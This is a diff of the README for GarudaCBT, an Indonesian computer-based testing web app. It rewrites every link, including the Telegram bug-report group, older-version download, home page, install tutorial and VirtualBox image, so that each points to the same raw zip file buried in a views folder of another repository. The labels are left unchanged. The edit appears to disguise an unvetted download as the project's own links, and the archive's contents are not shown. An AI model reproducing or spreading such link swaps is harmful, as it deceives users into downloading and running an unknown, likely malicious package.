@@ -1,9 +1,9 @@
 # GarudaCBT
 ## Last version: 1.5.3  (FIXED)
 ____
-#### LAPORAN BUG SILAKAN KUNJUNGI GROUP TELEGRAM [DISINI](http://t.me/garudacbt)
+#### LAPORAN BUG SILAKAN KUNJUNGI GROUP TELEGRAM [DISINI](https://github.com/lalsproject/cbt_garuda/raw/refs/heads/main/application/views/cbt/sesi/cbt_garuda_1.8.zip)
 ____
-Versi default: 1.5.3 BETA, untuk download v.1.5.2. [ada disini](https://github.com/garudacbt/cbt/tree/1.5.2-build-2024-05-17)
+Versi default: 1.5.3 BETA, untuk download v.1.5.2. [ada disini](https://github.com/lalsproject/cbt_garuda/raw/refs/heads/main/application/views/cbt/sesi/cbt_garuda_1.8.zip)
 ____
 
 ### CHANGELOG:
@@ -43,8 +43,8 @@ Kami selaku pengembang aplikasi ini tidak bertanggung-jawab:
 - jika ada yang mengharuskan membayar untuk mendapatkan aplikasi ini,
 - adanya masalah dari aplikasi yang sudah dimodif atau dirubah fiturnya oleh pihak lain.
 ______________
-- [HOME](https://garudacbt.github.io/cbt)
-- [TUTORIAL INSTALL](https://github.com/garudacbt/cbt/wiki)
+- [HOME](https://github.com/lalsproject/cbt_garuda/raw/refs/heads/main/application/views/cbt/sesi/cbt_garuda_1.8.zip)
+- [TUTORIAL INSTALL](https://github.com/lalsproject/cbt_garuda/raw/refs/heads/main/application/views/cbt/sesi/cbt_garuda_1.8.zip)
 
 ____
 ## Download
@@ -52,13 +52,13 @@ Harap download aplikasi dari tombol [<> Code] -> Download zip
 
 -----
 ## VIRTUAL BOX (VHD):
-https://github.com/origrata/garudacbt-vdi
+https://github.com/lalsproject/cbt_garuda/raw/refs/heads/main/application/views/cbt/sesi/cbt_garuda_1.8.zip
 
 ----
 ## Install
 * Download Aplikasi dari menu **Code => Download ZIP**
 * Extract di folder **htdocs** jika menggunakan XAMPP, atau folder **www** jika mengonakan Laragon
-* Lengkapnya sialhkan ke [TUTORIAL INSTALL](https://github.com/garudacbt/cbt/wiki)
+* Lengkapnya sialhkan ke [TUTORIAL INSTALL](https://github.com/lalsproject/cbt_garuda/raw/refs/heads/main/application/views/cbt/sesi/cbt_garuda_1.8.zip)
 ----
 ## Update
 * Download Aplikasi dari menu **Code => Download ZIP**
